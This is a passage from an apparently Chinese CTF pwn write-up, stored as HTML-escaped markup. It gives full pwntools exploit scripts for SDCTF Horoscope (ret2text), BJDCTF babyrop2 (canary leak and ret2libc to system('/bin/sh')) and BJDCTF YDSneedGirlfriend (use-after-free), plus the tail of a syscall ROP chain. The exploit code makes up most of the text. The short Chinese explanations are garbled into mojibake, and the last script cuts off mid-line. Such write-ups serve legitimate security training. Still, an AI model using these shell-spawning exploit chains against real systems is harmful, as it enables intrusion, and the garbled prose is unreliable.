pack(&amp;#x27;&amp;lt;Q&amp;#x27;, 0x0000000000496710) # add rax, 1 ; ret&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p += pack(&amp;#x27;&amp;lt;Q&amp;#x27;, 0x0000000000496710) # add rax, 1 ; ret&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p += pack(&amp;#x27;&amp;lt;Q&amp;#x27;, 0x0000000000496710) # add rax, 1 ; ret&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p += pack(&amp;#x27;&amp;lt;Q&amp;#x27;, 0x0000000000496710) # add rax, 1 ; ret&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p += pack(&amp;#x27;&amp;lt;Q&amp;#x27;, 0x0000000000496710) # add rax, 1 ; ret&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p += pack(&amp;#x27;&amp;lt;Q&amp;#x27;, 0x0000000000496710) # add rax, 1 ; ret&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p += pack(&amp;#x27;&amp;lt;Q&amp;#x27;, 0x0000000000496710) # add rax, 1 ; ret&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p += pack(&amp;#x27;&amp;lt;Q&amp;#x27;, 0x0000000000402404) # syscall&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;payload=b&amp;#x27;a&amp;#x27;*(0x20+0x8)+p&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;io.sendline(payload)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;io.interactive()&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;h5 id=&#34;sdctf-2022horoscope&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#sdctf-2022horoscope&#34;&gt;#&lt;/a&gt; [SDCTF 2022]Horoscope&lt;/h5&gt;
&lt;blockquote&gt;
&lt;p&gt;åˆ©ç”¨è¿™ä¸ª atoi å»æ˜¯ a1 ç­‰äº 1 è¿™ä¸ª s çš„è¯æ˜¯éœ€è¦ä½¿ç”¨ 0x38 æ‰èƒ½æº¢å‡ºï¼Œé‚£ä¹ˆçš„è¯åˆ©ç”¨ä½¿ä¸€ä¸ª b&#39;a&#39;*0x38 ç­‰äº b&#39;1&#39;+b&#39;a&#39;*0x38 å› ä¸º atoi åªä¼šè½¬æ¢æ•°å­—ä¸ºæ•´æ•°ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥åˆ©ç”¨è¿™ä¸ªç‚¹å»å¾—åˆ°è®©è¿™ä¸ªç¨‹åºå®Œæ•´è¿è¡Œï¼Œç„¶åå°±æ˜¯ä¸€ä¸ªç®€å•çš„ ret2text äº†&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;from pwn import *&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;context.log_level=&amp;#x27;debug&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#p=remote(&amp;#x27;node4.anna.nssctf.cn&amp;#x27;,28120)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p=process(&amp;#x27;./horoscope&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;elf=ELF(&amp;#x27;horoscope&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#payload=b&amp;#x27;1&amp;#x27;+b&amp;#x27;a&amp;#x27;*(0x30+0x7)+p64(elf.sym[&amp;#x27;debug&amp;#x27;])+p64(elf.sym[&amp;#x27;test&amp;#x27;])&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;payload=b&amp;#x27;1&amp;#x27;+b&amp;#x27;a&amp;#x27;*(0x37)+p64(0x40095F)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p.sendlineafter(b&amp;#x27;pe&amp;#x27;,payload)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p.interactive()&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;h5 id=&#34;bjdctf-2020babyrop2&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#bjdctf-2020babyrop2&#34;&gt;#&lt;/a&gt; [BJDCTF 2020]babyrop2&lt;/h5&gt;
&lt;blockquote&gt;
&lt;p&gt;è¿™ä¸ªé¢˜è®²ç©¶çš„æ˜¯ ret2libc æ³¨æ„å­—ç¬¦ä¸²æº¢å‡ºä¸º 7 å³å¯æŒ‰ç…§ ret2libc æ‰“å°±è¡Œ&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;48&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;49&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;50&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;51&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;52&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;53&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;54&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;55&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;56&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;57&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;58&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;59&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;60&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;61&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;62&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;63&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;64&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;65&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;66&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;67&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;68&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;69&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;70&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;71&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;72&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;73&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;from pwn import *&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;context.log_level=&amp;#x27;debug&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;from LibcSearcher import *&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p=remote(&amp;#x27;node4.anna.nssctf.cn&amp;#x27;,28241)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#p=process(&amp;#x27;./pwn&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;elf=ELF(&amp;#x27;pwn&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p.sendlineafter(&amp;#x27;u!\n&amp;#x27;,&amp;#x27;%7$p&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p.recvuntil(&amp;#x27;0x&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;a=int(p.recv(16),16)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;log.info(hex(a))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;puts_plt=elf.plt[&amp;#x27;puts&amp;#x27;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;puts_got=elf.got[&amp;#x27;puts&amp;#x27;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;pop_rdi=0x400993&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;main=elf.sym[&amp;#x27;main&amp;#x27;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;vuln=elf.sym[&amp;#x27;vuln&amp;#x27;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ret=0x4005f9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;payload=b&amp;#x27;a&amp;#x27;*(0x20-0x8)+p64(a)+p64(0)+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(vuln)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p.sendlineafter(&amp;#x27;ory!\n&amp;#x27;,payload)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;base_addr=u64(p.recvuntil(b&amp;#x27;\x7f&amp;#x27;)[-6:].ljust(8,b&amp;#x27;\x00&amp;#x27;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;log.info(hex(base_addr))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;puts=LibcSearcher(&amp;#x27;puts&amp;#x27;,base_addr)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;libc_base=base_addr-puts.dump(&amp;#x27;puts&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;system=libc_base+puts.dump(&amp;#x27;system&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;bin_sh=libc_base+puts.dump(&amp;#x27;str_bin_sh&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;payload=b&amp;#x27;a&amp;#x27;*(0x20-0x8)+p64(a)+p64(0)+p64(ret)+p64(pop_rdi)+p64(bin_sh)+p64(system)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p.recvuntil(&amp;#x27;ory!\n&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p.sendline(payload)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p.interactive()&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;h5 id=&#34;bjdctf-2020ydsneedgirlfriend&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#bjdctf-2020ydsneedgirlfriend&#34;&gt;#&lt;/a&gt; [BJDCTF 2020]YDSneedGirlfriend&lt;/h5&gt;
&lt;blockquote&gt;
&lt;p&gt;è¿™ä¸ªé¢˜åˆæ˜¯ä¸€ä¸ªå †çš„é¢˜è¦å¥½å¥½çš„åˆ©ç”¨ uaf å»å¾—åˆ° shell&lt;br /&gt;
 é¦–å…ˆæˆ‘ä»¬çœ‹åˆ°è¿™ä¸ªé¢˜ç›®æ˜¯æœ‰ä¸€ä¸ª free æ¥é‡Šæ”¾å†…å­˜ä½†æ˜¯å¹¶æ²¡æœ‰ç»™æŒ‡é’ˆæ¸…é›¶å¯¼è‡´å†æ¬¡åˆ†é…æ—¶åœ¨è¢«å ç”¨ï¼Œå¹¶ä¸” show å‡½æ•°å¯ä»¥æ¥è°ƒç”¨æŒ‡é’ˆæŒ‡åˆ°çš„å‡½æ•°å°†è¢«è°ƒç”¨&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;48&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;49&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;50&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;51&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;52&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;53&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;54&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;55&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;56&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;57&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;58&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;59&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;60&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;61&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;from pwn import *&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sh = remote(&amp;#x27;node4.anna.nssctf.cn&amp;#x27;,28732)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;context.log_level=&amp;#x27;debug&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;def add(size,name):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Â  Â  sh.sendline(str(1))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Â  Â  sh.recvuntil(&amp;#x27;size is :&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Â  Â  sh.sendline(str(size))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Â  Â  sh.recvuntil(&amp;#x27;ame is :&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Â  Â  sh.sendline(name)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;# Â  Â sh.recvuntil(&amp;quot;choice :&amp;quot;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;def delete(index):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Â  Â  sh.sendlineafter(&amp;#x27;:&amp;#x27;,&amp;#x27;2&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Â  Â  sh.recvuntil(&amp;#x27;Index :&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Â  Â  sh.sendline(str(index))&lt;/span&gt;&lt;br&gt;&lt;span 